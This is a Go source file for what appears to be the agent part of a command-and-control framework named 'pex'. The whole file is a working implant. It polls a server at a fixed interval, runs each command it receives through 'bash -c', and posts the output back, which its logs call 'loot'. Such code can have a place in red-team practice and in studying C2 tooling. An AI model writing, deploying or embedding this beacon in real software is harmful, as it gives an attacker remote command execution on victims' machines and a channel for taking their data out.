package agent

import (
	"bytes"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/hardal7/pex/internal/config"
)

func executeCommand(command []string) (string, string) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer

	var commandExists bool = false
	var cmd *exec.Cmd
	if len(command) != 0 {
		command = append([]string{"-c"}, strings.Join(command, " "))
		cmd = exec.Command("bash", command...)
		commandExists = true
	}

	if commandExists {
		cmd.Stdout = &stdout
		cmd.Stderr = &stderr

		err := cmd.Run()
		if err != nil {
			slog.Error("Failed executing command: " + err.Error())
			fmt.Println(command)
		}
		slog.Info("Executed command")
		return stdout.String(), stderr.String()

	}
	return "", ""
}

func makeRequest() {
	requestURL := "http://localhost:" + config.Port
	request, _ := http.NewRequest("GET", requestURL, nil)

	response, err := http.DefaultClient.Do(request)
	if err != nil {
		slog.Info("Failed to send request to server: " + err.Error())
		return
	} else {
		slog.Info("Sent request to server")
	}

	body, _ := io.ReadAll(response.Body)
	command := strings.Fields(string(body[:]))

	var out, errout string
	if string(body) != "" {
		slog.Info("Executing command: " + string(body))
		out, errout = executeCommand(command)
	}
	slog.Info("Output:\n" + out)
	if errout != "" {
		slog.Info("Error Output: " + errout)
	}

	slog.Info("Sending loot to server")
	_, err = http.Post(requestURL, "text/plain", bytes.NewBuffer([]byte(out+errout)))
	if err != nil {
		slog.Info("Failed sending loot to server: " + err.Error())
	} else {
		slog.Info("Sent loot to server")
	}
}

func Serve() {
	for {
		makeRequest()
		time.Sleep(time.Duration(config.Interval) * time.Second)
	}
}
